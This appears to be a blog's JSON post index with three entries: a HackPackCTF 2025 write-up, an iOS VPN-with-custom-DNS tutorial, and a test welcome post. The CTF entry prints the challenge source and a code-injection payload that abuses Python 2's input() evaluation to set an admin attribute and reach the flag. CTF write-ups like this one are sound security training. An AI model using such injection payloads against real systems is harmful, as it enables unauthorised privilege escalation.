[ { "title": "HackPackCTF 2025: WeAreGreenLLC", "url": "/posts/HackPackCTF-WeAreGreenLLC/", "categories": "CTF", "tags": "HackPackCTF", "date": "2025-05-01 04:00:00 -0400", "content": " Category: PWN Difficulty: Easy Points: 500 Below is the full source code provided for the challenge: from os import getenv import re from sys import stdout import __builtin__ import inspect SECRET = getenv('SECRET', 'SECRET{THIS_IS_NOT_A_FLAG}') # Step 2: Disable all imports def blocked_import(name, *args, **kwargs): raise ImportError(\"All imports are disabled.\") __builtin__.__import__ = blocked_import # Step 3: Disable all dangerous functions __builtin__.__dict__['execFile'] = None __builtin__.__dict__['compile'] = None __builtin__.__dict__['exec'] = None __builtin__.__dict__['eval'] = None __builtin__.__dict__['open'] = None __builtin__.__dict__['reload'] = None class User: def __init__(self, name): self.name = name def secured_attribute_update(self, key, value, secret): if not isinstance(secret, str): raise TypeError(\"Only string literals are allowed!\") # Inspect the caller's frame for global variables caller_globals = inspect.currentframe().f_back.f_globals # Check if the argument references any global object (like a dict) for var_name, var_value in caller_globals.items(): if id(secret) == id(var_value): # Compare object identities raise ValueError(\"Global variables are not allowed as arguments!\") if secret != SECRET: print(\"Woah! Wrong secret! You are not allowed to do that!\") stdout.flush() return setattr(self, key, value) print(\"Existing attribute updated successfully!\") stdout.flush() def __repr__(self): return \"User: \" + self.name def main(): user = User(\"Player\") print(\"Welcome,\", user) while True: try: print(\"Do you want the flag? (y/n)\") stdout.flush() user_input = raw_input() if user_input == \"y\": print(\"You need the secret to get the flag! What's the secret? \") stdout.flush() secret = input() if secret == SECRET: print(\"Oops! You still need to get Admin access! Are you admin 'yet'? (y/n) \") stdout.flush() is_admin = raw_input() if is_admin == \"y\": if user.is_admin == True: match = re.search(r'SECRET{(.*?)}', SECRET) if match: flag_key = match.group(1) print(getenv(flag_key)) stdout.flush() else: print(\"You are not allowed to do that!\") stdout.flush() else: print(\"You Liar! You are not an admin! Try again!\") stdout.flush() else: print(\"I will allow you to try until you become an admin!\") stdout.flush() else: print(\"Oops! Wrong secret! Try again!\") stdout.flush() else: print(str.format(\"{user.name} said: \" + user_input + \" - Means, you don't want the flag! No worries, you can try again!\", user=user)) stdout.flush() except Exception as e: print(\"You are not allowed to do that!\") stdout.flush() if __name__ == \"__main__\": main() Clues Obviously we should work through the various prompts and checks to reach a state where the program will simply give us the flag. How could we manipulate secret? Notice the distinction between raw_input() and input(). In python 2, input() results are evaluated as code, and the presence of __builtin__ instead of builtin tells us this is python 2. We’ll know we succeeded if we get the “oops” message printed out: Do you want the flag? (y/n) y You need the secret to get the flag! What's the secret? SECRET Oops! You still need to get Admin access! Are you admin 'yet'? (y/n) Alright, so we can manipulate secret. The next check is whether user.is_admin is True. Here, a clue lies above. in secured_attribute_update(), setattr() is used to change a local attribute. Could this work for us? According to Python Documentation, setattr(x, ‘foobar’, 123) is equivalent to x.foobar = 123 Let’s try it: You need the secret to get the flag! What's the secret? setattr(user, 'is_admin', True) Oops! Wrong secret! Try again! Do you want the flag? (y/n) y You need the secret to get the flag! What's the secret? SECRET Oops! You still need to get Admin access! Are you admin 'yet'? (y/n) y hackpackCTF{...} Bingo! Solution Do you want the flag? (y/n) y You need the secret to get the flag! What's the secret? SECRET Oops! You still need to get Admin access! Are you admin 'yet'? (y/n) y You are not allowed to do that! Do you want the flag? (y/n) y You need the secret to get the flag! What's the secret? setattr(user, 'is_admin', True) Oops! Wrong secret! Try again! Do you want the flag? (y/n) y You need the secret to get the flag! What's the secret? SECRET Oops! You still need to get Admin access! Are you admin 'yet'? (y/n) y hackpackCTF{...} Which we can shorten to: Do you want the flag? (y/n) y You need the secret to get the flag! What's the secret? setattr(user, 'is_admin', True) or SECRET Oops! You still need to get Admin access! Are you admin 'yet'? (y/n) y hackpackCTF{...} " }, { "title": "VPN with Custom DNS on iOS Using Passepartout", "url": "/posts/VPN-with-Custom-DNS-on-iOS-Using-Passepartout/", "categories": "Privacy", "tags": "VPN, DNS, iOS", "date": "2025-04-24 04:00:00 -0400", "content": "iOS has excellent support for VPNs and custom DNS servers, but what about both at the same time? This article explains reasons to use a VPN and custom DNS, as well as the solution to use both on iOS via an app called Passepartout. Why to use a VPN VPNs (Virtual Private Networks) are a foundational tool in any privacy and security arsenal. VPNs have three primary utilities: Hiding traffic from intermediary third-parties Hiding your true IP from the sites you visit and apps you use Connecting private networks without exposing between traffic VPNs work by negotiation a connection between two computers, typically your laptop/smartphone and a VPN server, then routing all traffic through that connection in an unreadable way. This means that your internet service provider or work wi-fi cannot see what websites you’re visiting. Additionally, it means the websites you’re visiting don’t know what network you’re actually connecting from; they only see the VPN address. Let’s consider a scenario. Say you access your email without using a VPN, and your internet address is 1.2.3.4. If you’re the only one who uses 1.2.3.4, then your email can include that information in a profile about you, and sell that at their discretion. Then, a month later, you visit DivorceLawyers.com using the same address, 1.2.3.4. See the trouble? Additionally, my internet provider can see what websites I visit, and they would know I visited DivorceLawyers.com, and they can sell that information at their discretion. What if we used a VPN instead? I access my email, and the internet address is a random address from a huge pool of addresses the VPN server can use. Maybe 5.6.7.8 one day, maybe 9.10.11.12 another day, etc. Now, if I visit DivorceLawyers.com, my internet address of 56.12.48.192 could be any user of the same VPN service, of which there could be tens or hundreds of thousands of people. Additionally, because my traffic is unreadable until it gets to the VPN server, my internet provider only sees random garbled Klingon nonsense, instead of seeing DivorceLawyers.com. VPNs are not a magic bullet in the privacy world. Advertisers and data brokers are always inventing clever new ways to watch you online. That said, a VPN is an important piece in the grand privacy puzzle. Why to use Custom DNS DNS (Domain Name System) is a core part of how the internet works. When you type in DivorceLawyers.com, how does your computer know where to go? The answer is DNS. The DNS system allows computers to look up the corresponding internet addresses when given a domain name, like wtthomas.org, divorcelawyers.com, or google.com. The owner of the domain can specify what internet address should be used, and can change it as needed. This means us humans don’t have to memorize crazy numbers like 14.12.58.124, we can just memorize amazon.com. Most computers use the default DNS specified by their network router, usually Google, Microsoft, Cloudflare, or some other huge tech company. But we have other options, and privacy enthusiasts can obtain major benefits from using custom DNS services that give us control over how this system works on our computers. For all the same reasons that Amazon or Google use DNS, trackers and advertisers also rely on the DNS system to keep their systems functioning. For example, when you load a webpage that uses Google Analytics to track you, your computer will query googleanalytics.com to get the internet address so it knows where to send the tracking information. So… what if it never got a response? What if your computer did not receive the internet address for googleanalystics.com? It would have no idea where to send the tracking information, and thus, the attempt to watch you online is foiled. However, this has been possible for a long time using popular browser extensions that stop the trackers from loading. What makes custom DNS special is that it doesn’t just apply to your browser, it applies to your entire computer, or even your entire network. Custom DNS can even be used as an effective parental control to stop entire apps from working, even if the DNS isn’t configured on a specific computer. The Challenge on iOS Given all the discussion above, privacy enthusiasts should be excited to load custom DNS and a VPN on their mobile devices. Most Android smartphones make this easy, but Apple mobile devices present some obstacles. Let’s take ProtonVPN and NextDNS, both highly popular services in their categories, for this example. If I install the NextDNS configuration profile using their installation instructions, everything works great! Additionally, if I install the ProtonVPN iOS app, it also works great. However, when I activate my VPN, I drop out of my custom DNS configuration. Why? Most VPNs override your default DNS settings. For all the reasons I covered, DNS can be used to track what websites you’re visiting. If you’re using a VPN, but you’re also using Google DNS, then Google can still see what websites you’re visiting based on your DNS queries, even if the traffic is unreadable. So, VPNs overwrite this to use their own DNS servers to prevent tracking. This is great by default, but we don’t have any control or visibility into those DNS servers. While some apps like ProtonVPN offer tracking blockers via their DNS, there’s no control or granularity, just a On/Off toggle. If I need to temporarily turn off my “tracking protection” to make a site load, I have to turn all of my DNS protection off, not just whitelist the needed domain. Enter Passepartout After much testing and head-scratching, I found Passepartout about two years ago. After a rock-solid two years, I am comfortable recommending Passerpartout as the solution to the problem of custom DNS and VPNs on iOS. Below is a tutorial on how to set up Passepartout using ProtonVPN and NextDNS. In the top right hand corner, tap the plus sign and choose &gt;Provider&gt;ProtonVPN&gt;OpenVPN. Next, tap Add module and click DNS Then, tap on the newly added DNS module to change the settings. Change Protocol to Over HTTPS and add the URL provided by NextDNS. Change Route through VPN to Yes. Tap Add address under SERVERS and add the two internet addresses provided by NextDNS. If you want to report the device name, you can optionally add a forward slash and a name to the URL. The above steps should be universal regardless of VPN provider. The steps below show the remaining configuration required to use OpenVPN via ProtonVPN. The steps below will be different depending whether your VPN provider allows outside-the-app VPN connections and how they choose to supply the credentials. Navigate to https://account.protonvpn.com/account-password#openvpn, or log in to ProtonVPN in your browser and find the Account menu in the top-left corner. Scroll down until you find the OpenVPN / IKEv2 username. This is the username/password that you will use for Passepartout. This is also where you will reset those credentials if you suspect they’ve been compromised (or on a regular basis if you want better security hygiene). There are some additional configurations I recommend, such as excluding mobile data from the VPN connection to save data, but I’ll leave you to test your setup and make quality-of-life changes as you see fit. Make sure you have the normal NextDNS configuration profile installed if you create exceptions for the VPN. If your VPN fails or intentionally disconnects, iOS will fall back to this profile and keep your DNS filtered like normal. " }, { "title": "Welcome", "url": "/posts/Welcome/", "categories": "", "tags": "", "date": "2025-04-19 04:00:00 -0400", "content": "Welcome to my blog! This is a test post. Posts should have full markdown capability, with excellent display characteristics for code blocks and alerts/prompts. Here’s some code: for(int i = 0; i &lt; 5; i++) { System.out.println(\"Hello world.\"); } Here’s some prompts: You can do tip level. You can do info level. You can do warning level. You can do danger level. There’s also support for images, videos, tables, and basically anything else Markdown supports. Onward! " } ]
